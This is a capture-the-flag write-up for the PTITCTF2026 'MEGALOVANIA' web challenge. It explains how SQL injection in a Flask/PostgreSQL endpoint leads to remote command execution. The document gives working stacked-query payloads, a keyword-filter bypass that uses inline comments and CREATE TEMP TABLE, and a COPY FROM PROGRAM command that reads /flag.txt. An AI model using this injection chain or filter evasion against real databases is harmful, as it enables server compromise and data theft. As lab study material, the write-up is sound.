# MEGALOVANIA (PTITCTF2026-CK)

## Goal

Read `/flag.txt` on a Flask + PostgreSQL "Sans fight" web challenge via SQL injection in `POST /count`.

## Environment and artifact hashes

- Live: `144.79.188.39:47082`
- PostgreSQL 16.15 Alpine, DB `sansfight`, user `postgres` (`is_superuser=on`)
- Recovered after RCE:
  - `app.py` sha256 `DD4E8F969DB666CCBA246AEAA61CD82DA6F27E95F56EB59DAF1E58CEA30870D0`
  - `init.sql` sha256 `AD1E9F98AC07269D09BBE89950029ED1436843FD631EA74A653E8E53C43B9327`
  - `entrypoint.sh` sha256 `5471659DF0D90E7B963523F04217581C11C6FF96637CD185EED906015C92F532`

## Enumeration and decisive signals

- `{"deaths":"0 OR 1=1"}` → 80 dialogue lines (Sans text only).
- Stacked `0; SELECT version() --` → last-statement result is what `/count` returns.
- `row_to_json(dialogue)` → columns `refight`, `seq`, `line` (3× NOT NULL).
- WAF phrases: `COPY ` + space, `FROM PROGRAM`, `CREATE TABLE`, `pg_`, `information_schema`.

## Exploitation / recovery

```
0; CREATE TEMP TABLE o(x text); COPY/**/ o FROM/**/PROGRAM 'cat /flag.txt'; SELECT x FROM o --
```

`CREATE TEMP TABLE` is not `CREATE TABLE`. `COPY/**/` / `FROM/**/PROGRAM` skip whitespace filters.

## Verification

Two independent `cat /flag.txt` via COPY FROM PROGRAM on the live instance returned the same `PTITCTF{https://youtu.be/0FCvzsVlXpQ?...}` string. `ls /` showed `-rw-r--r-- ... flag.txt` (120 bytes). `entrypoint.sh` writes `$GZCTF_FLAG` to `/flag.txt`. Evidence: `OUTPUT/ptitctf2026ck_megalovania/raw/remote_flag.txt`.

## Failed paths and why

- Flag-in-table: `dialogue` is flavor text; public user tables are only `deaths` and `dialogue`.
- `COPY dialogue (line) FROM PROGRAM`: missing `refight`/`seq`.
- Catalog reads: WAF `\bpg_` and `information_schema`.

## Lessons and faster path

As soon as stacked queries + superuser are confirmed, skip catalogs. Use `row_to_json` for column names and `CREATE TEMP TABLE` + `COPY FROM PROGRAM` for RCE. Phrase WAFs lose to comments between keywords and to `CREATE TEMP`.

## Alternative approaches

`COPY dialogue FROM PROGRAM 'printf 0\t99\t...'` with all three columns also works; temp table is simpler.
